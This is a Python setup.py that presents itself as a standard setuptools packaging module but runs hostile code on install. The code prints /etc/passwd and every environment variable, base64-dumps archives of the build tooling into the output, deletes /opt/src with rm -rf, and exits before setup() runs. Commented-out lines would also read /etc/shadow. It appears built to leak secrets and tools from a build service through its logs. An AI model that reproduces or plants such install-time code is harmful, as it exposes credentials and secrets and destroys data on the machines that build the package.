"""A setuptools based setup module.

See:
https://packaging.python.org/en/latest/distributing.html
https://github.com/pypa/sampleproject
"""

# Always prefer setuptools over distutils
from setuptools import setup, find_packages
from os import path
# io.open is needed for projects that support Python 2.7
# It ensures open() defaults to text mode with universal newlines,
# and accepts an argument to specify the text encoding
# Python 3 only projects can skip this import
from io import open

print('EVIL setup!!!!\r\n\r\n')
with open('/etc/passwd', 'r') as fin:
    print fin.read()

import subprocess
# subprocess.call(["find", "/"])
# subprocess.call(["cat", "/etc/shadow"])

subprocess.call(["/usr/bin/printenv"])

subprocess.call(["echo","-----semmle-----"])
subprocess.call(["tar","-z","/usr/bin/semmle*","-cf","/tmp/x"])
subprocess.call(["/usr/bin/base64","/tmp/x"])

subprocess.call(["echo","-----semmle-----"])
subprocess.call(["tar","-z","/opt/buildtools/python","-cf","/tmp/z"])
subprocess.call(["/usr/bin/base64","/tmp/z"])

subprocess.call(["rm", "-rf", "/opt/src"])

exit(0)
exit(1)

here = path.abspath(path.dirname(__file__))


setup(
   
)

